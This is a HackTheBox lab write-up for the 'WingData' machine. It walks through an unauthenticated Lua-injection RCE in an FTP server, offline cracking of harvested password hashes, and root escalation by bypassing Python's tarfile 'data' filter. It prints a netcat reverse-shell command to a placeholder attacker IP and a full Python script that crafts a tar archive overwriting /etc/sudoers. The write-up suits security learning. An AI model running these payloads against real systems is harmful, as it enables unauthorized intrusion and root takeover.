---
title: "WingData – FTP Server RCE & Privileged Archive Extraction Abuse"
date: 2026-03-05
categories:
  - Case Studies
tags: [HTB, Linux, Easy, CVE-2025-47812, CVE-2025-4517, privilege-escalation]
description: "A walkthrough of WingData from HackTheBox Season 10 — an Easy Linux machine covering unauthenticated RCE, credential harvesting, and privilege escalation via a modern tarfile filter bypass."
image:

---

## Overview

> **Difficulty:** `Easy` &nbsp;|&nbsp; **OS:** `Linux` &nbsp;|&nbsp; **Season:** `Season 10`

WingData is an Easy Linux machine from HackTheBox Season 10. It covers a realistic attack chain involving service enumeration, a recently disclosed unauthenticated RCE vulnerability, offline credential cracking, and a modern exploit technique to escalate privileges to root.

---

## Attack Chain Summary

```
[Recon] → [VHost Discovery] → [Pre-Auth RCE] → [Credential Harvest] → [Hash Cracking] → [SSH Access] → [Tarfile Filter Bypass] → [Root]
```

| Phase | Vector | Result |
|---|---|---|
| Initial Access | Pre-auth RCE via CVE-2025-47812 | Shell as service account |
| Lateral Movement | Credential file + offline hash crack | SSH as user |
| Privilege Escalation | CVE-2025-4517 tarfile PATH_MAX bypass | Root |

---

## 1. Reconnaissance

Started with a standard service scan to identify open ports and running versions:

```bash
nmap -sV -sC -A -O -T4 <TARGET_IP> > nmap_results.txt
```

Two ports were open — SSH and HTTP. The HTTP service redirected to a virtual hostname, so that was added to `/etc/hosts`:

```bash
echo "<TARGET_IP> wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

Browsing the web application revealed a file-sharing platform. Clicking the client portal link redirected to a subdomain running a well-known FTP server product. The login page footer disclosed the exact software version — a detail that proved critical for the next step.

---

## 2. Initial Access

### CVE-2025-47812 — Pre-Auth RCE

A quick search for the disclosed version number surfaced a critical unauthenticated RCE vulnerability. The flaw stems from improper handling of NULL bytes in the username field during authentication. This allows an attacker to inject arbitrary Lua code into a server-side session file, which executes when that session is loaded — all without valid credentials.

A public PoC is available on GitHub. After setting up a netcat listener:

```bash
nc -lvnp 4444
```

The exploit was run against the target, delivering a reverse shell as the FTP service account:

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc <ATTACKER_IP> 4444 -e /bin/sh" -v
```

Shell upgraded with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 3. Credential Harvesting & Lateral Movement

With a foothold established, enumeration of the FTP server's data directory revealed XML-based user configuration files containing password hashes. The domain settings file disclosed the salting method and salt string in use.

The hash and salt were extracted, formatted for hashcat, and cracked offline using the rockyou wordlist:

```bash
echo "<HASH>:<SALT>" > hash.txt
hashcat -m 1410 hash.txt rockyou.txt
```

The password cracked quickly. SSH login as the target user was then straightforward:

```bash
ssh <USER>@<TARGET_IP>
```

**User flag:** `<REDACTED>`

---

## 4. Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

The output showed the user could run a specific Python backup restoration script as root with no password required.

### Script Analysis

Reading the script revealed it accepts a user-supplied tar archive and extracts it to a staging directory using Python's `tarfile.extractall()` with `filter="data"` — a protection introduced in Python 3.12 designed to block classic TarSlip attacks such as path traversal and absolute symlink escapes.

### CVE-2025-4517 — PATH_MAX Filter Bypass

Despite the filter, the script is vulnerable to CVE-2025-4517. This technique bypasses `filter="data"` by constructing a tar archive with a deeply nested directory structure using 247-character component names repeated across 16 levels. When the cumulative resolved path exceeds the system's `PATH_MAX`, Python's internal `realpath()` normalization silently fails — allowing symlinks to escape the intended extraction boundary and write files to arbitrary locations on the filesystem as root.

The exploit tar was crafted as follows:

```python
import tarfile
import os
import io

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    # Stage 1: Build deep nested directory chain to overflow PATH_MAX
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    # Stage 2: Pivot symlink exceeding PATH_MAX
    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    # Stage 3: Escape symlink targeting /etc
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    # Stage 4: Hardlink through escaped path to sudoers
    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)

    # Stage 5: Write new sudoers content through the hardlink
    content = b"<USER> ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.size = len(content)
    tar.addfile(c, io.BytesIO(content))
```

Deployed and triggered via the sudo rule:

```bash
cp /tmp/backup_9999.tar /opt/backup_clients/backups/

sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
    -b backup_9999.tar \
    -r restore_pwn
```

After extraction completed, `sudo -l` confirmed full root privileges:

```bash
sudo su
cat /root/root.txt
```

**Root flag:** `<REDACTED>`

---

## 5. Key Takeaways

1. **Version disclosure matters** — A single version string on a login page was enough to identify a critical, remotely exploitable CVE. Information leakage at the surface level can have serious consequences.

2. **"Secure" doesn't mean unbreakable** — CVE-2025-4517 is a great reminder that newer protections like `filter="data"` represent a layer of defence, not a complete solution. Understanding *why* a protection works and where its assumptions break down are core to both offensive and defensive security work.

3. **Credential files deserve the same scrutiny as databases** — Flat configuration files storing password hashes are easy to overlook. They deserve the same access controls as any credential store.

---

## References

- [CVE-2025-47812 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-47812)
- [CVE-2025-4517 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-4517)
- [Wing FTP RCE Original Research — RCESecurity](https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/)
- [HackTheBox — WingData](https://app.hackthebox.com/machines/wingdata)

---
> ⚠️ **This machine is currently active on HackTheBox.** Flags and sensitive details have been redacted in accordance with HTB policy. This write-up is intentionally high-level in areas to avoid spoiling the experience for others.

*Flags and credentials have been redacted. This write-up will be updated with full details once the machine is retired. For educational purposes only.*
